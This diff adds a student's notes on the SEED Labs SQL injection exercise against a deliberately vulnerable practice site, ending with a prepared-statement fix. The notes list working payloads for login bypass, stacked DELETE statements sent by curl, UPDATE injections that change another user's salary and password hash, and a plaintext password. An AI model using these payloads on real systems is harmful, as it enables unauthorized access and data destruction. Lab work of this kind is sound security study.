@@ -1,0 +1,68 @@
+3.1 - Done
+	got a better pic
+3.2.1 - Done
+	Not bad, what I typed in was:
+	Username: admin';#
+	Password:dotdotdot;
+	It worked
+3.2.2 - Done
+	looks very wrong, but still readable
+	had to use a different url than what was given in pdf
+	used the username above as well as the same password
+	try this:
+	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%3B%23&Password='
+	other script:
+		its technically all there, just a pain to read
+3.2.3 - In Process
+	Very hard
+	tyring to understand slide 3
+	if the WHERE concludes the sql part, how am I supposed to append a new statement
+	not possible, but******
+	check slide 30 in SQL slides (the bottom of the slide)
+
+3.3.1 - Finished
+	try this:
+	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin';DELETE FROM credential WHERE name='Boby';#&Password'
+	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%3BDELETE%20FROM%20credential%20WHERE%20name=%27Boby%27%3B%23&Password='
+	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%20%OR%201=1%3B%20DELETE%20FROM%20credential%20WHERE%20name=%27Boby%27%3B%23&Password='
+
+	just don't curl it bruh, just go to the edit profile and submit it manually
+
+3.3.2 - Done
+	hard, but going
+	need to get to the WHERE statement
+	tried:
+		idiot',salary=1 WHERE name='Boby';";#
+		idiot', salary=1 WHERE name='Boby'";# 
+		idiot',salary=1, WHERE name='Boby'";--
+		idiot',salary='1' WHERE name='Boby';
+	worked:
+		idiot',salary='1' WHERE name='Boby';#
+	other script:
+		we successfully changed Boby's salary and nickname (sorry, kinda harsh!)
+3.3.3 - In Progress
+	Password in string: ezPa$$
+	Password through hash: c20e4b339112c7b6624a7438241869e900d4a4d0
+	worked:
+		',Password='c20e4b339112c7b6624a7438241869e900d4a4d0' WHERE name='Boby';#
+		I'm not typing in the password field because its all dots, cannot confirm that it is what I set it to.
+	other script:
+		should just be 6 dots, which are:
+		ezPa$$
+		
+		we're in!
+	
+4.
+      // create a connection
+      $conn = getDB();
+      // Sql query to authenticate the user
+      $sql = $conn->prepare("SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
+      FROM credential
+      WHERE name= ? and Password= ?");
+      $sql->bind_param("ss", $input_uname, $hashed_pwd);
+      $sql->execute();
+      $sql->bind_result($id, $name, $eid, $salary, $birth, $ssn, $phoneNumber, $address, $email, $nickname, $pwd);
+      $sql->fetch();
+      $sql->close();
+		
+
